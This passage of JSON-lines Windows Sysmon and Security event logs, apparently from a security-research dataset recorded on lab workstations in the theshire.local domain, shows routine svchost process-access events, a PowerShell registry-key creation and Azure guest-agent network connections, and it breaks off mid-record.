AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309437,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:46.121","EventTime":"2020-09-04 03:29:46","EventReceivedTime":"2020-09-04 03:29:48","@timestamp":"2020-09-04T07:29:48.618Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"SourceModuleType":"im_msvistalog","Version":2,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-09-04 07:29:46.980\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-3125456671-949036322-3048627137-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","AccountType":"User","tags":["mordorDataset"],"Domain":"NT AUTHORITY","Opcode":"Info","UserID":"S-1-5-18","SourceName":"Microsoft-Windows-Sysmon","Hostname":"WORKSTATION5.theshire.local","ThreadID":4344,"EventType":"CreateKey","RecordNumber":309438,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9223372036854775808,"Severity":"INFO","OpcodeValue":0,"AccountName":"SYSTEM","host":"wec.internal.cloudapp.net","EventID":12,"ProcessId":"1376","port":53971,"@version":"1","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Category":"Registry object added or deleted (rule: RegistryEvent)","EventReceivedTime":"2020-09-04 03:29:48","Task":12,"UtcTime":"2020-09-04 07:29:46.980","EventTime":"2020-09-04 03:29:46","Channel":"Microsoft-Windows-Sysmon/Operational","@timestamp":"2020-09-04T07:29:48.619Z","EventTypeOrignal":"INFO","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"RuleName":"-","Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"HKU\\S-1-5-21-3125456671-949036322-3048627137-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:47.168\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 448\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"448","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309439,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:47.168","EventTime":"2020-09-04 03:29:47","EventReceivedTime":"2020-09-04 03:29:49","@timestamp":"2020-09-04T07:29:49.615Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:47.168\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 448\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"448","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309440,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:47.168","EventTime":"2020-09-04 03:29:47","EventReceivedTime":"2020-09-04 03:29:49","@timestamp":"2020-09-04T07:29:49.615Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:47.168\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309441,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:47.168","EventTime":"2020-09-04 03:29:47","EventReceivedTime":"2020-09-04 03:29:49","@timestamp":"2020-09-04T07:29:49.616Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:47.168\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309442,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:47.168","EventTime":"2020-09-04 03:29:47","EventReceivedTime":"2020-09-04 03:29:49","@timestamp":"2020-09-04T07:29:49.617Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:48.183\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309443,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:48.183","EventTime":"2020-09-04 03:29:48","EventReceivedTime":"2020-09-04 03:29:50","@timestamp":"2020-09-04T07:29:50.619Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:48.183\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309444,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:48.183","EventTime":"2020-09-04 03:29:48","EventReceivedTime":"2020-09-04 03:29:50","@timestamp":"2020-09-04T07:29:50.619Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:48.183\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 448\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"448","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309445,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:48.183","EventTime":"2020-09-04 03:29:48","EventReceivedTime":"2020-09-04 03:29:50","@timestamp":"2020-09-04T07:29:50.619Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:48.183\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 448\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"448","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309446,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:48.183","EventTime":"2020-09-04 03:29:48","EventReceivedTime":"2020-09-04 03:29:50","@timestamp":"2020-09-04T07:29:50.620Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":0,"Message":"The Windows Filtering Platform has permitted a bind to a local port.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3228\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-04_054713\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tSource Address:\t\t0.0.0.0\r\n\tSource Port:\t\t57174\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t0\r\n\tLayer Name:\t\tResource Assignment\r\n\tLayer Run-Time ID:\t36","Application":"\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-04_054713\\guestagent\\windowsazureguestagent.exe","FilterRTID":"0","LayerName":"%%14608","Opcode":"Info","SourceName":"Microsoft-Windows-Security-Auditing","Hostname":"WORKSTATION6.theshire.local","EventType":"AUDIT_SUCCESS","ThreadID":3468,"RecordNumber":47276,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9214364837600034816,"Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","EventID":5158,"ProcessId":"3228","port":53971,"@version":"1","SourcePort":"57174","Category":"Filtering Platform Connection","EventReceivedTime":"2020-09-04 03:29:50","LayerRTID":"36","Task":12810,"EventTime":"2020-09-04 03:29:48","Channel":"Security","Protocol":"6","@timestamp":"2020-09-04T07:29:50.621Z","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceAddress":"0.0.0.0"}
{"Version":1,"Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3228\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-04_054713\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.6\r\n\tSource Port:\t\t57174\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t71566\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Application":"\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-04_054713\\guestagent\\windowsazureguestagent.exe","FilterRTID":"71566","LayerName":"%%14611","Opcode":"Info","SourceName":"Microsoft-Windows-Security-Auditing","Hostname":"WORKSTATION6.theshire.local","EventType":"AUDIT_SUCCESS","ThreadID":3468,"RecordNumber":47277,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9214364837600034816,"DestPort":"80","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","EventID":5156,"DestAddress":"168.63.129.16","Direction":"%%14593","port":53971,"RemoteUserID":"S-1-0-0","@version":"1","SourcePort":"57174","ProcessId":"3228","Category":"Filtering Platform Connection","EventReceivedTime":"2020-09-04 